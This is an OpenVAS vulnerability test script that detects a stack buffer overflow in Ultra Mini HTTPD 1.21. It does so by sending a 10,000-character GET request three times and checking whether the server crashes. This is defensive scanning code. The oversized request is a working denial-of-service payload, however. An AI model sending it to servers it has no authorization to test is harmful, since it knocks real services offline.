###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ultra_minihttpd_server_bof_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Ultra Mini HTTPD Stack Buffer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803721");
  script_version("$Revision: 11401 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-07-16 11:19:36 +0530 (Tue, 16 Jul 2013)");
  script_name("Ultra Mini HTTPD Stack Buffer Overflow Vulnerability");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause the application to crash, creating a denial-of-service condition.");
  script_tag(name:"vuldetect", value:"Send a large crafted data via HTTP GET request and check the server is crashed
or not.");
  script_tag(name:"affected", value:"Ultra Mini HTTPD server Version 1.21");
  script_tag(name:"insight", value:"The flaw is due to an error when processing certain long requests and can be
exploited to cause a denial of service via a specially crafted packet.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Ultra Mini HTTPD server and is prone to stack based buffer
overflow vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/26739/");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/windows/ultra-mini-httpd-121-stack-buffer-overflow");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

req = http_get(item:string("/index.html"), port:port);
res = http_send_recv(port:port, data:req);

if(!res || ">Ultra Mini Httpd" >!< res){
  exit(0);
}

req = http_get(item:string("A",crap(10000)), port:port);

## Send crafted request
for(i=0;i<3;i++){
  res = http_send_recv(port:port, data:req);
}

req = http_get(item:string("/index.html"), port:port);
res = http_send_recv(port:port, data:req);

if(">Ultra Mini Httpd" >!< res){
  security_message(port);
}
